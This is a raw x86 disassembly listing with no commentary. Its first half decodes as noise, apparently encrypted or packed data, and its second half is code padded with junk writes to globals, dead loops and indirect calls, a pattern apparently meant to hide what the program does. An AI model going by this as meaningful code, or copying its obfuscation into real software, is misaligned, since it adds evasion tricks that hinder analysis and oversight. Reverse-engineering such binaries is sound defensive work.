  40302e:	or     esi,DWORD PTR [di]
  403031:	fiadd  WORD PTR [esp+eiz*8+0x17]
  403035:	aas    
  403036:	push   esi
  403037:	mov    eax,0x35c82350
  40303c:	(bad)  
  40303d:	jns    0x403007
  40303f:	mov    eax,DWORD PTR [ebx]
  403041:	es add eax,0x6077cc6b
  403047:	aam    0x4c
  403049:	retf   0x7e9c
  40304c:	fs ret 
  40304e:	stc    
  40304f:	ret    0xff29
  403052:	push   edx
  403053:	or     BYTE PTR [ebx],ah
  403055:	in     al,dx
  403056:	jp     0x40300a
  403058:	retf   
  403059:	jo     0x402fff
  40305b:	xchg   esi,eax
  40305c:	sbb    dh,BYTE PTR [edi-0x5ef08d10]
  403062:	retf   0xf794
  403065:	jl     0x403027
  403067:	or     al,0x1e
  403069:	jmp    0x2239cd9b
  40306e:	loopne 0x4030b1
  403070:	imul   DWORD PTR [esi]
  403072:	mov    eax,ds:0x665babe2
  403077:	fiadd  WORD PTR [eax]
  403079:	push   0x49e00cf2
  40307e:	mov    ds:0x600b6952,al
  403083:	mov    al,0x99
  403085:	cli    
  403086:	cs mov esi,0x4e45215d
  40308c:	test   DWORD PTR [ecx+0x65],ebx
  40308f:	scas   al,BYTE PTR es:[edi]
  403090:	int3   
  403091:	mov    ds:0xb1b5fd38,al
  403096:	std    
  403097:	or     BYTE PTR [eax-0x6e],bl
  40309a:	mov    ecx,0xc5ccf034
  40309f:	or     ebp,edi
  4030a1:	inc    esp
  4030a2:	and    esi,DWORD PTR [ecx+0x62]
  4030a5:	idiv   BYTE PTR [ebp+0x2bda7f48]
  4030ab:	sub    esp,DWORD PTR [ecx]
  4030ad:	jbe    0x403125
  4030af:	out    dx,eax
  4030b0:	or     al,0xb7
  4030b2:	dec    edi
  4030b3:	and    eax,0xa18edeab
  4030b8:	addr16 test ch,dl
  4030bb:	sbb    esi,edx
  4030bd:	cs retf 0xfe7d
  4030c1:	push   edx
  4030c2:	pop    ebx
  4030c3:	jmp    0x40313c
  4030c5:	ds inc ecx
  4030c7:	in     eax,dx
  4030c8:	pop    ss
  4030c9:	aaa    
  4030ca:	ja     0x403083
  4030cc:	mov    esp,0x81c410b2
  4030d1:	add    DWORD PTR [esi],ecx
  4030d3:	lods   al,BYTE PTR ds:[esi]
  4030d4:	jnp    0x4030fe
  4030d6:	in     al,dx
  4030d7:	jo     0x40309e
  4030d9:	outs   dx,BYTE PTR ds:[esi]
  4030da:	(bad)
  4030dd:	xchg   BYTE PTR [ebp+eiz*2+0x2014d6e4],ch
  4030e4:	jnp    0x4030eb
  4030e6:	cwde   
  4030e7:	fistp  WORD PTR [edx]
  4030e9:	(bad)  
  4030ea:	fiadd  DWORD PTR [edi+0x6]
  4030ed:	fcom   QWORD PTR [edi-0x5e]
  4030f0:	lods   eax,DWORD PTR ds:[esi]
  4030f1:	mov    dl,BYTE PTR [edx-0x3a97fa19]
  4030f7:	repz mov cl,0xcd
  4030fa:	cmp    ecx,DWORD PTR [ecx]
  4030fc:	rol    DWORD PTR [ebx+0x17],1
  4030ff:	sub    ebp,0xfffffff5
  403102:	push   eax
  403103:	repnz cmp BYTE PTR [edx+0x750a86b4],ah
  40310a:	std    
  40310b:	push   es
  40310c:	mov    ebx,0x6b9e196d
  403111:	inc    ebp
  403112:	or     BYTE PTR [edi+0x1e],al
  403115:	in     eax,0x38
  403117:	cs pushf 
  403119:	or     al,0xba
  40311b:	scas   eax,DWORD PTR es:[edi]
  40311c:	clc    
  40311d:	lods   al,BYTE PTR ds:[esi]
  40311e:	rol    dh,cl
  403120:	gs out dx,eax
  403122:	inc    ebx
  403123:	pop    ebp
  403124:	dec    ecx
  403125:	mov    ds:0x5a8791ab,eax
  40312a:	dec    esp
  40312b:	aad    0x6a
  40312d:	adc    eax,edi
  40312f:	mov    eax,ds:0x3df4740a
  403134:	adc    edi,DWORD PTR [ecx]
  403136:	pop    edx
  403137:	adc    al,0xb
  403139:	scas   eax,DWORD PTR es:[edi]
  40313a:	ins    BYTE PTR es:[edi],dx
  40313b:	mov    al,ds:0x5e59af59
  403140:	mov    esp,es
  403142:	jae    0x40316a
  403144:	mov    eax,0xbf812d13
  403149:	ds jo  0x4031b6
  40314c:	enter  0xd855,0xfd
  403150:	ss inc ebp
  403152:	xchg   edx,ebx
  403154:	pop    ebx
  403155:	(bad)
  403159:	jns    0x40312f
  40315b:	inc    eax
  40315c:	daa    
  40315d:	es call 0x55348567
  403163:	mov    dh,0x7b
  403165:	int3   
  403166:	stc    
  403167:	in     al,dx
  403168:	(bad)  
  403169:	cmp    eax,0x1e0eda39
  40316e:	(bad)  
  40316f:	cmp    eax,0xac1c9bdb
  403174:	fwait
  403175:	add    BYTE PTR [ebp-0x68],dl
  403178:	std    
  403179:	and    eax,0x943c0f93
  40317e:	in     eax,0xe0
  403180:	bound  eax,QWORD PTR [esi]
  403182:	aaa    
  403183:	xor    ecx,DWORD PTR [edx+0x79]
  403186:	inc    edx
  403187:	sbb    al,0xb2
  403189:	popa   
  40318a:	fwait
  40318b:	and    al,BYTE PTR [edi]
  40318d:	or     ah,0x87
  403190:	adc    al,0xa6
  403192:	mov    ch,bh
  403194:	fwait
  403195:	push   ds
  403196:	mov    ah,0x83
  403198:	mov    esi,0x4f37158c
  40319d:	dec    ebp
  40319e:	sbb    BYTE PTR [ebx+0x3c],dh
  4031a1:	pop    edx
  4031a2:	fwait
  4031a3:	scas   al,BYTE PTR es:[edi]
  4031a4:	xor    DWORD PTR [ecx-0x6],ebx
  4031a7:	xchg   edx,eax
  4031a8:	fcomp  st(4)
  4031aa:	loopne 0x40315f
  4031ac:	mov    ds,eax
  4031ae:	stc    
  4031af:	in     al,dx
  4031b0:	mov    DWORD PTR [ebx],eax
  4031b2:	mov    esp,0x4c06d9b7
  4031b7:	jno    0x4031a4
  4031b9:	in     al,dx
  4031ba:	inc    esp
  4031bb:	or     eax,0xb3a17580
  4031c0:	out    0x51,al
  4031c2:	mov    WORD PTR [eax+0x43b5fdcc],es
  4031c8:	inc    ecx
  4031c9:	std    
  4031ca:	(bad)  
  4031cb:	and    eax,0x9315496d
  4031d0:	xchg   esi,eax
  4031d1:	mov    ebp,0x330663
  4031d6:	popf   
  4031d7:	jb     0x40323d
  4031d9:	test   BYTE PTR [ebx+0x482d01ab],dh
  4031df:	jmp    0x69eb:0x12b8abd1
  4031e6:	scas   eax,DWORD PTR es:[edi]
  4031e7:	sbb    cl,BYTE PTR [edi-0x72b6c235]
  4031ed:	ins    BYTE PTR es:[edi],dx
  4031ee:	cdq    
  4031ef:	or     al,0x58
  4031f1:	leave  
  4031f2:	push   eax
  4031f3:	aas    
  4031f4:	mov    al,0x9d
  4031f6:	push   0x166bd1ba
  4031fb:	test   al,0x93
  4031fd:	ds call 0x82afe742
  403203:	push   0x8
  403205:	inc    ebx
  403206:	xchg   esp,eax
  403207:	add    BYTE PTR [esi-0xe0c08e7],bl
  40320d:	mov    esi,0xab039504
  403212:	ja     0x4031ff
  403214:	sbb    eax,0x2e19c16a
  403219:	hlt    
  40321a:	lahf   
  40321b:	das    
  40321c:	jl     0x4031e8
  40321e:	dec    esp
  40321f:	sub    dh,BYTE PTR [edi+0x60d7e2e8]
  403225:	mov    esi,0xa190a997
  40322a:	ror    DWORD PTR ds:0xc39fcaee,0x51
  403231:	mov    ebx,0xcea1b767
  403236:	std    
  403237:	ret    
  403238:	and    BYTE PTR [ecx+0x62d0626b],0x6d
  40323f:	inc    edi
  403240:	addr16 pop esi
  403242:	inc    edi
  403243:	mov    ds:0xe9e7dfd4,eax
  403248:	xchg   edi,eax
  403249:	jge    0x403274
  40324b:	pop    esi
  40324c:	mov    esi,0x840d0b87
  403251:	test   eax,0x7e006f00
  403256:	jne    0x403250
  403258:	mov    dh,0xa2
  40325a:	add    DWORD PTR [eax+0x2],0x57
  40325e:	adc    dh,BYTE PTR [edi-0x73451f58]
  403264:	ins    BYTE PTR es:[edi],dx
  403265:	imul   ebx,ecx,0xfffffff5
  403268:	adc    ah,0xd8
  40326b:	into   
  40326c:	pop    ebp
  40326d:	rcr    DWORD PTR [edi+0xf],0x3a
  403271:	jnp    0x40322e
  403273:	jg     0x403294
  403275:	adc    al,BYTE PTR [edi]
  403277:	jno    0x40326c
  403279:	sbb    bl,BYTE PTR [edi+0x68]
  40327c:	pushf  
  40327d:	nop
  40327e:	ins    DWORD PTR es:[edi],dx
  40327f:	shl    DWORD PTR [edi+edi*2-0x3e991e95],1
  403286:	test   BYTE PTR [edx+ebx*1+0x3ba9de6d],ch
  40328d:	retf   0x1e06
  403290:	sbb    edi,ebx
  403292:	sbb    eax,0x8003d1d
  403297:	mov    ah,0xef
  403299:	pop    edi
  40329a:	or     eax,0xfefd399a
  40329f:	adc    DWORD PTR [ebx],ebx
  4032a1:	test   eax,0xbada152b
  4032a6:	loop   0x40325e
  4032a8:	xor    BYTE PTR [edx+0x5254c5d0],cl
  4032ae:	mov    edi,0x2e3722f8
  4032b3:	add    eax,0x3e9599d7
  4032b8:	retf   0xb9db
  4032bb:	mov    cl,0x52
  4032bd:	dec    ebp
  4032be:	inc    esi
  4032bf:	mov    ch,0x35
  4032c1:	mov    dl,0x10
  4032c3:	sbb    BYTE PTR [edi+ebp*1-0x61],ah
  4032c7:	sahf   
  4032c8:	inc    esp
  4032c9:	mov    ds:0x9af13937,eax
  4032ce:	pop    ds
  4032cf:	imul   edi,DWORD PTR fs:[edi],0x33e43dc2
  4032d6:	mov    ds:0xa312b30f,al
  4032db:	push   ebp
  4032dc:	add    cl,BYTE PTR [ebx]
  4032de:	fadd   st(0),st
  4032e0:	clc    
  4032e1:	push   edx
  4032e2:	fs mov esi,0x92c82e
  4032e8:	mov    al,ds:0x799325df
  4032ed:	pop    esi
  4032ee:	mov    esi,0xb55e8d81
  4032f3:	cli    
  4032f4:	dec    ebp
  4032f5:	repz push 0x386885d3
  4032fb:	lods   eax,DWORD PTR ds:[esi]
  4032fc:	jbe    0x403306
  4032fe:	adc    bh,bl
  403300:	ds mov dh,0x0
  403304:	pop    ds
  403305:	shl    ah,cl
  403307:	and    eax,0x78b3d43e
  40330c:	mov    cl,0x13
  40330e:	or     BYTE PTR [esi-0x7b],cl
  403311:	jb     0x403345
  403313:	mov    ah,0xc0
  403315:	and    eax,0xf559c865
  40331a:	int3   
  40331b:	je     0x403332
  40331d:	push   ds
  40331e:	hlt    
  40331f:	out    0x55,eax
  403321:	adc    ebx,esp
  403323:	repz js 0x403360
  403326:	adc    dh,BYTE PTR [edx]
  403328:	fdiv   QWORD PTR [eax]
  40332a:	adc    BYTE PTR [esi-0x6e1792c0],al
  403330:	adc    BYTE PTR [edx+0x7085d990],ah
  403336:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403337:	mov    al,ds:0xaba083d5
  40333c:	out    0x73,eax
  40333e:	pop    eax
  40333f:	add    BYTE PTR [esi],bh
  403341:	ror    BYTE PTR [ebx+edi*2+0x24],1
  403345:	pop    ds
  403346:	and    ebx,0x7b
  403349:	in     al,0x4
  40334b:	xchg   ebx,eax
  40334c:	sahf   
  40334d:	sub    bl,bl
  40334f:	lods   eax,DWORD PTR ds:[esi]
  403350:	jb     0x40334d
  403352:	fild   WORD PTR [eax+0x19fc5066]
  403358:	ficomp WORD PTR [edi-0x2ab23d70]
  40335e:	test   BYTE PTR [ebx+0x7f],ah
  403361:	popf   
  403362:	ds jl  0x4033c6
  403365:	cmc    
  403366:	(bad)  ds:0x9e9b9aa5
  40336c:	push   eax
  40336d:	popa   
  40336e:	ss adc al,0x18
  403371:	sub    bh,dl
  403373:	jmp    0xc48b:0x8f5784c9
  40337a:	mov    eax,0xfd316264
  40337f:	dec    edx
  403380:	test   al,0x78
  403382:	cmp    DWORD PTR [edx],edx
  403384:	xchg   ecx,eax
  403385:	arpl   WORD PTR [esi+0x6],bp
  403388:	shr    ch,cl
  40338a:	enter  0xf6d2,0xb3
  40338e:	cmp    DWORD PTR [ebp+0x4e],0x3d
  403392:	sub    eax,0xcc8db91b
  403397:	mov    edi,0x7cee557b
  40339c:	in     eax,0xe7
  40339e:	clc    
  40339f:	mov    edx,0x590ebed5
  4033a4:	nop
  4033a5:	adc    ebp,DWORD PTR [eax]
  4033a7:	es push eax
  4033a9:	adc    ebx,esi
  4033ab:	xor    BYTE PTR [esi+0x44ee3be0],bl
  4033b1:	xchg   edx,eax
  4033b2:	fcomp  DWORD PTR [edi+ebp*8]
  4033b5:	fsub   QWORD PTR [edi]
  4033b7:	stos   BYTE PTR es:[edi],al
  4033b8:	dec    edx
  4033b9:	or     dh,BYTE PTR [edi+0x7e545fe5]
  4033bf:	(bad)  
  4033c0:	sbb    cl,BYTE PTR [esi]
  4033c2:	mov    DWORD PTR [ebx+0x4c],ebx
  4033c5:	cmp    al,0x81
  4033c7:	cwde   
  4033c8:	jle    0x403449
  4033ca:	pop    eax
  4033cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4033cc:	call   0xc99:0xe1eb423f
  4033d3:	jge    0x40337c
  4033d5:	mov    dl,0x22
  4033d7:	jne    0x40344a
  4033d9:	mov    eax,ds:0x82a000bf
  4033de:	jne    0x4033fa
  4033e0:	imul   esi,eax,0x4d
  4033e3:	hlt    
  4033e4:	mov    ebx,gs
  4033e6:	dec    ecx
  4033e7:	sbb    al,0xa4
  4033e9:	sub    DWORD PTR [edi+0x1fc46daa],ecx
  4033ef:	sbb    eax,0x5486d7f6
  4033f4:	add    al,0xdf
  4033f6:	jbe    0x40342c
  4033f8:	mov    ah,0xc7
  4033fa:	jl     0x403473
  4033fc:	shl    DWORD PTR [ecx],1
  4033fe:	mov    ebp,0x5cfaeedc
  403403:	dec    esp
  403404:	test   eax,0x1cab16ab
  403409:	mov    esp,0x4f014d32
  40340e:	fistp  WORD PTR [edi+0x48]
  403411:	pop    es
  403412:	pop    esi
  403413:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403414:	xchg   esi,eax
  403415:	dec    eax
  403416:	pop    esp
  403417:	js     0x40345d
  403419:	sbb    esi,DWORD PTR [ebx-0x3da82313]
  40341f:	push   ebx
  403420:	or     eax,DWORD PTR [esi]
  403422:	mov    bl,0xce
  403424:	enter  0x3513,0xfc
  403428:	cmc    
  403429:	mov    ebp,0x4e21bfa5
  40342e:	int    0x24
  403430:	popa   
  403431:	fsubr  st,st(0)
  403433:	mov    eax,0xf78a424e
  403438:	pop    edx
  403439:	rcr    DWORD PTR [ecx],0x2c
  40343c:	fld    QWORD PTR [esi+0x6162408a]
  403442:	out    dx,eax
  403443:	push   edx
  403444:	das    
  403445:	pop    edx
  403446:	inc    ebp
  403447:	sbb    ah,ah
  403449:	or     dl,BYTE PTR [ebp+0x4acb6876]
  40344f:	adc    al,0x29
  403451:	xor    BYTE PTR [edi],dl
  403453:	cmc    
  403454:	jae    0x403433
  403456:	adc    eax,0x318cbb85
  40345b:	sbb    BYTE PTR [edx+0x7a68dcf8],ah
  403461:	ss jg  0x403484
  403464:	mov    BYTE PTR [esi-0x42850730],dh
  40346a:	push   ss
  40346b:	pop    ds
  40346c:	sar    BYTE PTR [esi],1
  40346e:	out    dx,eax
  40346f:	cmp    al,0xc3
  403471:	sar    DWORD PTR [eax],cl
  403473:	or     eax,0x65b4769e
  403478:	pop    es
  403479:	mov    bh,0xa0
  40347b:	les    edx,FWORD PTR [ecx]
  40347d:	mov    ?,WORD PTR [ecx]
  40347f:	dec    edi
  403480:	in     eax,dx
  403481:	inc    esi
  403482:	cmp    dl,ah
  403484:	popa   
  403485:	mov    edx,0x601a508a
  40348a:	imul   esi,eax,0xffffff9a
  40348d:	mov    WORD PTR [eax+0x7e],cs
  403490:	sub    eax,0xb868ea35
  403495:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403496:	dec    edx
  403497:	loope  0x4034b6
  403499:	or     BYTE PTR [ebp-0x3b],al
  40349c:	xor    DWORD PTR [edx+0x13be0e8d],edi
  4034a2:	jmp    0x40343c
  4034a4:	ficomp WORD PTR [ebx-0x62]
  4034a7:	shl    esp,1
  4034a9:	xor    dh,0x9f
  4034ac:	or     ch,BYTE PTR [edi+0x564f2409]
  4034b2:	outs   dx,DWORD PTR ds:[esi]
  4034b3:	bound  ebx,QWORD PTR [edx-0x1969f788]
  4034b9:	cmp    eax,0x3fb742c4
  4034be:	dec    ecx
  4034bf:	scas   al,BYTE PTR es:[edi]
  4034c0:	adc    bl,BYTE PTR [ebp+0x4d]
  4034c3:	add    DWORD PTR [ecx+0x6e],esi
  4034c6:	(bad)  
  4034c7:	fidivr WORD PTR [ebp+0x10f8aa2d]
  4034cd:	shl    DWORD PTR [ecx-0x2],1
  4034d0:	push   esi
  4034d1:	mov    WORD PTR [ecx],fs
  4034d3:	push   esi
  4034d4:	lea    ebp,[edi]
  4034d6:	jmp    0x403547
  4034d8:	mov    eax,0x2b5e4866
  4034dd:	xchg   ebp,eax
  4034de:	test   eax,0x4a735cfd
  4034e3:	sub    al,0xe0
  4034e5:	push   edx
  4034e6:	xchg   DWORD PTR [edi],ecx
  4034e8:	cld    
  4034e9:	shr    DWORD PTR [ecx-0x18bd82e2],0x4
  4034f0:	cs xchg edi,eax
  4034f2:	(bad)  
  4034f3:	out    dx,eax
  4034f4:	cmc    
  4034f5:	dec    eax
  4034f6:	pop    ecx
  4034f7:	push   0x89e17d5a
  4034fc:	jg     0x403524
  4034fe:	adc    eax,0x86c2204d
  403503:	xor    DWORD PTR [ebp-0x58a89d88],edi
  403509:	cli    
  40350a:	les    ebp,FWORD PTR [eax+0x3f]
  40350d:	inc    ecx
  40350e:	adc    DWORD PTR [edx],0xc68cb6c8
  403514:	loop   0x40351e
  403516:	adc    ch,ch
  403518:	popa   
  403519:	gs jo  0x403583
  40351c:	sbb    eax,0xf0f770f5
  403521:	repnz jecxz 0x403568
  403524:	xchg   ebx,eax
  403525:	loop   0x4034f5
  403527:	fucomp st(3)
  403529:	xchg   edi,eax
  40352a:	fnstsw WORD PTR ds:[ebx+0x8]
  40352e:	adc    DWORD PTR [edi],0x9fef6e34
  403534:	cld    
  403535:	test   al,0x6d
  403537:	xchg   edi,eax
  403538:	jmp    0xa589c921
  40353d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40353e:	cmp    bl,BYTE PTR [esp+ebp*4]
  403541:	and    edx,DWORD PTR [ebx+ebx*8]
  403544:	sbb    al,0x8d
  403546:	call   0xec92:0x8f6118e1
  40354d:	hlt    
  40354e:	pop    edx
  40354f:	es xchg ebx,eax
  403551:	or     eax,0x972c5710
  403556:	inc    ebp
  403557:	sub    BYTE PTR [edi+0x6bf33ad5],cl
  40355d:	jno    0x4035dc
  40355f:	cmp    DWORD PTR [eax-0x5e77eb07],esi
  403565:	rcr    dh,cl
  403567:	ffree  st(4)
  403569:	ret    
  40356a:	inc    ecx
  40356b:	adc    eax,0x7ac009a3
  403570:	cwde   
  403571:	je     0x403500
  403573:	cmc    
  403574:	cld    
  403575:	shl    esp,1
  403577:	dec    esi
  403578:	bound  esp,QWORD PTR [ebp-0x30]
  40357b:	push   ss
  40357c:	dec    ebx
  40357d:	enter  0xe27d,0x86
  403581:	mov    ecx,0x6271394c
  403586:	iret   
  403587:	mov    dl,0x4b
  403589:	mov    eax,ds:0xc5e48f57
  40358e:	addr16 jns 0x4035d1
  403591:	sahf   
  403592:	mov    dl,0x39
  403594:	test   al,0xa1
  403596:	mov    al,ds:0xf55cbcb0
  40359b:	enter  0x78fa,0x1a
  40359f:	xor    eax,DWORD PTR [ebx-0x4e285783]
  4035a5:	push   0xc369491d
  4035aa:	or     BYTE PTR [esi+0x1fcc7084],bl
  4035b0:	add    dl,dl
  4035b2:	and    DWORD PTR [ebp+0x2a],edi
  4035b5:	sub    bh,0xc8
  4035b8:	dec    esi
  4035b9:	jmp    0x403636
  4035bb:	cs push edi
  4035bd:	or     al,0xa9
  4035bf:	mov    bl,0x19
  4035c1:	icebp  
  4035c2:	or     bh,ch
  4035c4:	dec    ebx
  4035c5:	(bad)  
  4035c7:	and    al,BYTE PTR [ecx+0x276cb21]
  4035cd:	retf   
  4035ce:	adc    BYTE PTR [edi-0x21],0x53
  4035d2:	pop    esi
  4035d3:	pop    es
  4035d4:	nop
  4035d5:	arpl   WORD PTR [edi-0x6d],di
  4035d8:	and    BYTE PTR [esi],dl
  4035da:	sub    al,0xaa
  4035dc:	jle    0x403623
  4035de:	jno    0x403564
  4035e0:	fistp  QWORD PTR [ecx-0x4c]
  4035e3:	xchg   ah,dl
  4035e5:	call   0xe521:0x919061e3
  4035ec:	push   eax
  4035ed:	test   BYTE PTR [ebx+0x53],0xc3
  4035f1:	push   dx
  4035f3:	jnp    0x40364b
  4035f5:	jns    0x4035f6
  4035f7:	(bad)  
  4035f9:	ins    BYTE PTR es:[edi],dx
  4035fa:	sub    eax,DWORD PTR [eax+eax*1+0x75115f0b]
  403601:	mov    DWORD PTR es:[ebp+0x41],ebp
  403605:	rcr    DWORD PTR [edx+0x60b40c5c],cl
  40360b:	cli    
  40360c:	loopne 0x40361c
  40360e:	or     esp,eax
  403610:	rol    DWORD PTR [esi+0x498debee],1
  403616:	xlat   BYTE PTR ds:[ebx]
  403617:	fiadd  DWORD PTR [ecx-0x3518937d]
  40361d:	dec    ecx
  40361e:	loopne 0x40369a
  403620:	cmp    DWORD PTR [ecx+0x6235c045],ecx
  403626:	add    BYTE PTR cs:[eax],al
  403629:	mov    eax,DWORD PTR [ebp-0x3c]
  40362c:	mov    DWORD PTR [ebp-0x14],eax
  40362f:	and    DWORD PTR ds:0x42a2de,0x0
  403639:	xor    ecx,ecx
  40363b:	xor    ecx,DWORD PTR ds:0x42a2de
  403641:	inc    ecx
  403642:	mov    DWORD PTR ds:0x42a2de,ecx
  403648:	cmp    DWORD PTR ds:0x42a2de,0xb
  40364f:	ja     0x40368d
  403655:	jmp    0x403666
  40365a:	push   DWORD PTR [ebp-0x10]
  40365d:	push   DWORD PTR [ebp-0x18]
  403660:	call   DWORD PTR ds:0x42a3c2
  403666:	cmp    DWORD PTR ds:0x42a2de,0xa
  40366d:	jne    0x403680
  403673:	mov    ecx,DWORD PTR ds:0x42a2de
  403679:	inc    ecx
  40367a:	mov    DWORD PTR ds:0x42a2de,ecx
  403680:	cmp    DWORD PTR ds:0x42a2de,0x12
  403687:	jb     0x403639
  40368d:	mov    eax,DWORD PTR [ebp-0x14]
  403690:	adc    DWORD PTR ds:0x42a2ee,edx
  403696:	push   0x4
  403698:	pop    ecx
  403699:	or     DWORD PTR ds:0x42a256,0x42a2ba
  4036a3:	sub    ecx,eax
  4036a5:	and    DWORD PTR ds:0x42a2ae,edx
  4036ab:	add    ecx,DWORD PTR [ebp-0x1c]
  4036ae:	sub    DWORD PTR ds:0x42a25a,0x29a3
  4036b8:	mov    DWORD PTR [ebp-0x2c],0xf89c85e5
  4036bf:	adc    DWORD PTR ds:0x42a2ba,0x27f4
  4036c9:	mov    DWORD PTR [ebp-0x18],ecx
  4036cc:	xor    eax,eax
  4036ce:	xor    eax,DWORD PTR ds:0x42a2c2
  4036d4:	or     DWORD PTR ds:0x42a276,eax
  4036da:	mov    DWORD PTR [ebp-0xa0],0xf89c85b9
  4036e4:	mov    eax,ds:0x42a27e
  4036e9:	or     DWORD PTR ds:0x42a27a,eax
  4036ef:	mov    eax,DWORD PTR [ebp-0x14]
  4036f2:	mov    DWORD PTR [ebp-0x9c],eax
  4036f8:	adc    DWORD PTR ds:0x42a29a,ecx
  4036fe:	mov    eax,DWORD PTR [ebp-0x18]
  403701:	mov    DWORD PTR [ebp-0x98],eax
  403707:	sbb    DWORD PTR ds:0x42a28a,0x5122
  403711:	mov    eax,DWORD PTR [ebp-0x2c]
  403714:	xor    eax,esi
  403716:	add    eax,edi
  403718:	or     DWORD PTR ds:0x42a27a,0x42a2ea
  403722:	mov    DWORD PTR [ebp-0x94],eax
  403728:	lea    eax,[ebp-0x48]
  40372b:	mov    DWORD PTR [ebp-0x90],eax
  403731:	mov    eax,DWORD PTR [ebp-0xa0]
  403737:	xor    eax,esi
  403739:	sbb    DWORD PTR ds:0x42a2f2,0x42a2da
  403743:	add    eax,edi
  403745:	or     DWORD PTR ds:0x42a2ee,0x42a256
  40374f:	mov    DWORD PTR [ebp-0xa0],eax
  403755:	sub    DWORD PTR ds:0x42a272,0x1d49
  40375f:	lea    eax,[ebp-0xa0]
  403765:	push   eax
  403766:	neg    eax
  403768:	mov    eax,DWORD PTR [ebp+0xc]
  40376b:	sub    DWORD PTR ds:0x42a2aa,0x2c11
  403775:	xor    eax,esi
  403777:	add    eax,edi
  403779:	push   eax
  40377a:	mov    eax,ds:0x42943e
  40377f:	push   0x429394
  403784:	mov    DWORD PTR ds:0x42a286,0x524d
  40378e:	push   DWORD PTR [eax]
  403790:	call   0x40a988
  403795:	xor    edx,edx
  403797:	add    edx,DWORD PTR ds:0x42a29e
  40379d:	and    DWORD PTR ds:0x42a28e,edx
  4037a3:	mov    ebx,DWORD PTR [ebp-0x14]
  4037a6:	mov    eax,DWORD PTR [ebp-0x18]
  4037a9:	mov    DWORD PTR [ebp-0x58],eax
  4037ac:	mov    eax,ds:0x42a306
  4037b1:	mov    edx,DWORD PTR ds:0x42a34e
  4037b7:	sub    edx,eax
  4037b9:	sub    eax,DWORD PTR [eax+edx*1]
  4037bc:	mov    DWORD PTR [ebp-0x34],0xf89c853f
  4037c3:	mov    eax,0xf89c85bb
  4037c8:	mov    DWORD PTR [ebp-0x1c],eax
  4037cb:	xor    DWORD PTR ds:0x42a286,0x37ec
  4037d5:	lea    ecx,[eax-0x16]
  4037d8:	and    DWORD PTR ds:0x42a2e2,0x0
  4037e2:	jmp    0x4037f4
  4037e7:	mov    edx,DWORD PTR ds:0x42a2e2
  4037ed:	inc    edx
  4037ee:	mov    DWORD PTR ds:0x42a2e2,edx
  4037f4:	cmp    DWORD PTR ds:0x42a2e2,0x18
  4037fb:	jae    0x40383b
  403801:	cmp    DWORD PTR ds:0x42a2e2,0x4
  403808:	jge    0x40383b
  40380e:	jmp    0x40381c
  403813:	push   DWORD PTR [ebp-0x14]
  403816:	call   DWORD PTR ds:0x42a3c6
  40381c:	cmp    DWORD PTR ds:0x42a2e2,0x3
  403823:	jne    0x403836
  403829:	mov    edx,DWORD PTR ds:0x42a2e2
  40382f:	inc    edx
  403830:	mov    DWORD PTR ds:0x42a2e2,edx
  403836:	jmp    0x4037e7
  40383b:	mov    DWORD PTR [ebp-0x28],ecx
  40383e:	sub    edx,DWORD PTR ds:0x42a2d6
  403844:	mov    DWORD PTR [ebp-0x10],0xf89c85ba
  40384b:	mov    edx,DWORD PTR ds:0x42a38a
  403851:	mov    edx,DWORD PTR [edx]
  403853:	xor    DWORD PTR ds:0x42a29a,edx
  403859:	mov    DWORD PTR [ebp-0x8],eax
  40385c:	mov    eax,DWORD PTR [ebp-0x10]
  40385f:	neg    edx
  403861:	xor    eax,esi
  403863:	mov    edx,0xffcd8d8f
  403868:	sub    edx,eax
  40386a:	mov    eax,ds:0x42a2fe
  40386f:	mov    DWORD PTR [ebp-0xc],edx
  403872:	mov    DWORD PTR [ebp-0x18],0xf89c85be
  403879:	mov    eax,DWORD PTR [ebp-0x8]
  40387c:	mov    DWORD PTR ds:0x42a2ce,0x6d9f
  403886:	mov    DWORD PTR [ebp-0x3c],ebx
  403889:	mov    DWORD PTR ds:0x42a286,0xb52
  403893:	cmp    eax,ecx
  403895:	mov    DWORD PTR ds:0x42a2d2,0x1900
  40389f:	je     0x40a6a8
  4038a5:	xor    DWORD PTR ds:0x42a2b6,edx
  4038ab:	mov    eax,DWORD PTR [ebp-0x10]
  4038ae:	mov    ecx,DWORD PTR [ebp-0x10]
  4038b1:	sub    DWORD PTR ds:0x42a266,0x42a2e2
  4038bb:	xor    eax,esi
  4038bd:	add    DWORD PTR ds:0x42a2ea,0x138
  4038c7:	xor    ecx,esi
  4038c9:	lea    ecx,[eax+ecx*1+0x64e5e2]
  4038d0:	and    DWORD PTR ds:0x42a26a,0x0
  4038da:	xor    eax,eax
  4038dc:	or     eax,DWORD PTR ds:0x42a26a
  4038e2:	inc    eax
  4038e3:	mov    ds:0x42a26a,eax
  4038e8:	cmp    DWORD PTR ds:0x42a26a,0x7
  4038ef:	jge    0x403935
  4038f5:	jmp    0x403910
  4038fa:	push   DWORD PTR [ebp-0x10]
  4038fd:	push   DWORD PTR [ebp-0x28]
  403900:	push   0x5cc9
  403905:	push   0x429181
  40390a:	call   DWORD PTR ds:0x42a3ca
  403910:	cmp    DWORD PTR ds:0x42a26a,0x6
  403917:	jne    0x403928
  40391d:	mov    eax,ds:0x42a26a
  403922:	inc    eax
  403923:	mov    ds:0x42a26a,eax
  403928:	cmp    DWORD PTR ds:0x42a26a,0x11
  40392f:	jb     0x4038da
  403935:	mov    eax,DWORD PTR [ebp-0xc]
  403938:	sbb    DWORD PTR ds:0x42a2c6,0x42a2f6
  403942:	xor    edx,edx
  403944:	or     DWORD PTR ds:0x42a29e,0x16dc
  40394e:	div    ecx
  403950:	or     eax,ecx
  403952:	mov    eax,DWORD PTR [ebp-0x8]
  403955:	xor    ecx,ecx
  403957:	xor    ecx,DWORD PTR ds:0x42a292
  40395d:	sbb    DWORD PTR ds:0x42a2fa,ecx
  403963:	mov    ecx,DWORD PTR [ebp-0x10]
  403966:	xor    eax,esi
  403968:	or     DWORD PTR ds:0x42a2c2,0x42a29a
  403972:	xor    ecx,esi
  403974:	sbb    DWORD PTR ds:0x42a2be,0x52cd
  40397e:	sub    eax,ecx
  403980:	cmp    edx,eax
  403982:	jne    0x408281
  403988:	mov    eax,DWORD PTR [ebp-0xc]
  40398b:	neg    ecx
  40398d:	mov    dl,BYTE PTR [eax+ebx*1+0x800]
